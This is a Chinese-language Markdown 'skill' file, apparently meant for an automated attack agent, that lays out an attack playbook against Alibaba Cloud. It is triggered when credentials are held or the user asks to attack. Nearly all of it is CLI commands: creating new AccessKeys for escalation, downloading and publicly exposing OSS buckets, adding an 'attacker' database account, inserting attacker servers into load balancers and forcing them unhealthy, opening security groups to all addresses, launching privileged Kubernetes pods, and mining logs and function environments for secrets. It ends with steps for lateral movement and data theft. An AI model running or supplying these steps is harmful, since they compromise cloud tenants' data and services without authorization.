---
name: aliyun-attack
type: attack
category: cloud
platform: aliyun
severity: high
---

# 阿里云攻击技能

## 触发条件

- 有阿里云凭证（AccessKey 或 STS Token）
- 目标使用阿里云
- 用户要求"攻击阿里云"

## 前置检查

```bash
# 1. 配置阿里云 CLI
aliyun configure

# 2. 验证凭证
aliyun sts GetCallerIdentity

# 3. 列出资源
aliyun ecs DescribeInstances --output cols=InstanceId
```

## 攻击方法

### 方法 1: RAM 权限提升

```bash
# 1. 获取当前用户信息
aliyun ram GetUser

# 2. 列出所有用户
aliyun ram ListUsers

# 3. 获取用户权限
aliyun ram ListPoliciesForUser --UserName USERNAME

# 4. 获取 AccessKey
aliyun ram ListAccessKeys --UserName USERNAME

# 5. 创建新的 AccessKey
aliyun ram CreateAccessKey --UserName USERNAME
```

### 方法 2: ECS 实例攻击

```bash
# 1. 列出所有实例
aliyun ecs DescribeInstances --output cols=InstanceId,InstanceName,Status

# 2. 获取实例详情
aliyun ecs DescribeInstances --InstanceIds i-INSTANCE_ID

# 3. 通过 VNC 连接（如果配置了）
aliyun ecs DescribeInstanceVncUrl --InstanceId i-INSTANCE_ID

# 4. 执行命令（如果安装了 Cloud Assistant）
aliyun ecs DescribeInstanceAttribute --InstanceId i-INSTANCE_ID --attributeName userData
```

### 方法 3: OSS 对象存储攻击

```bash
# 1. 列出所有 Bucket
aliyun oss ls

# 2. 列出 Bucket 内容
aliyun oss ls oss://BUCKET_NAME/

# 3. 下载文件
aliyun oss cp oss://BUCKET_NAME/OBJECT_PATH /tmp/

# 4. 设置 Bucket 为公开（如果有权限）
aliyun oss set-acl oss://BUCKET_NAME/ public-read
```

### 方法 4: RDS 数据库攻击

```bash
# 1. 列出所有实例
aliyun rds DescribeDBInstances --output cols=DBInstanceId,DBInstanceDescription

# 2. 获取数据库连接信息
aliyun rds DescribeDBInstances --DBInstanceId DB_INSTANCE_ID | \
  grep -i "ConnectionString"

# 3. 创建只读账号
aliyun rds CreateAccount --DBInstanceId DB_INSTANCE_ID \
  --AccountName attacker --AccountPassword Pass123!

# 4. 授权数据库访问
aliyun rds GrantAccountPrivilege --DBInstanceId DB_INSTANCE_ID \
  --AccountName attacker --DBName DATABASE_NAME --Privilege ReadOnly
```

### 方法 5: SLB 负载均衡攻击

```bash
# 1. 列出所有负载均衡
aliyun slb DescribeLoadBalancers --output cols=LoadBalancerId,Address,Status

# 2. 获取后端服务器
aliyun slb DescribeHealthStatus --LoadBalancerId LOAD_BALANCER_ID

# 3. 修改负载均衡配置（添加攻击者服务器）
aliyun slb AddBackendServers --LoadBalancerId LOAD_BALANCER_ID \
  --BackendServers "[{\"ServerId\":\"i-ATTACKER_ID\",\"Weight\":\"100\"}]"

# 4. 删除健康检查（DoS）
aliyun slb SetLoadBalancerHealthStatus --LoadBalancerId LOAD_BALANCER_ID --HealthStatus unhealthy
```

### 方法 6: 安全组利用

```bash
# 1. 列出所有安全组
aliyun ecs DescribeSecurityGroups --output cols=SecurityGroupId,Description

# 2. 获取安全组规则
aliyun ecs DescribeSecurityGroupAttribute --SecurityGroupId SG_ID

# 3. 添加后门规则（开放所有端口）
aliyun ecs AuthorizeSecurityGroup --SecurityGroupId SG_ID \
  --IpProtocol tcp --PortRange 1/65535 --SourceCidrIp 0.0.0.0/0

# 4. 或只开放攻击者 IP
aliyun ecs AuthorizeSecurityGroup --SecurityGroupId SG_ID \
  --IpProtocol tcp --PortRange 22/22 --SourceCidrIp ATTACKER_IP/32
```

### 方法 7: 容器服务攻击

```bash
# 1. 列出所有容器集群
aliyun cs DescribeClusters

# 2. 获取集群凭证
aliyun cs DescribeClusterUserKubeconfig --ClusterId CLUSTER_ID

# 3. 如果可以访问 K8s API
kubectl get nodes
kubectl get pods --all-namespaces

# 4. 创建特权 Pod
kubectl run privileged-pod --image=alpine --overrides='{
  "spec": {
    "containers": [{
      "name": "privileged",
      "securityContext": {"privileged": true}
    }]
  }
}'
```

### 方法 8: 日志服务利用

```bash
# 1. 列出所有日志库
aliyun log ListLogStores

# 2. 搜索敏感日志
aliyun log GetLogs --logstore LOG_STORE_NAME \
  --fromTime $(date -d '1 day ago' +%s) --toTime $(date +%s) \
  --query "password|secret|token" --powerSql

# 3. 导出日志
aliyun log PullLogs --logstore LOG_STORE_NAME \
  --fromTime $(date -d '1 day ago' +%s) --toTime $(date +%s) \
  --output-file /tmp/logs.json
```

### 方法 9: 函数计算攻击

```bash
# 1. 列出所有函数
aliyun fc ListFunctions --output cols=FunctionName,Runtime

# 2. 获取函数代码
aliyun fc GetFunction --serviceName SERVICE_NAME --functionName FUNCTION_NAME

# 3. 获取环境变量
aliyun fc GetFunction --serviceName SERVICE_NAME --functionName FUNCTION_NAME | \
  grep -i "environmentVariables"

# 4. 查看函数日志
aliyun fc GetLogs --serviceName SERVICE_NAME --functionName FUNCTION_NAME \
  --tail 100
```

### 方法 10: 密钥管理利用

```bash
# 1. 列出所有密钥
aliyun kms ListKeys

# 2. 获取密钥详情
aliyun kms DescribeKey --KeyId KEY_ID

# 3. 解密数据（如果有权限）
aliyun kms Decrypt --CiphertextBlob fileb://encrypted.bin

# 4. 或创建新密钥
aliyun kms CreateKey --Description "Malicious key"
```

## 验证成功

```bash
# 成功验证凭证
aliyun sts GetCallerIdentity

# 成功列出实例
aliyun ecs DescribeInstances

# 成功访问 OSS
aliyun oss ls oss://BUCKET_NAME/
```

## 下一步

1. 使用窃取的凭证访问更多阿里云服务
2. 通过 ECS 实例横向移动
3. 利用 OSS 窃取敏感数据
4. 通过容器服务攻击 K8s 集群
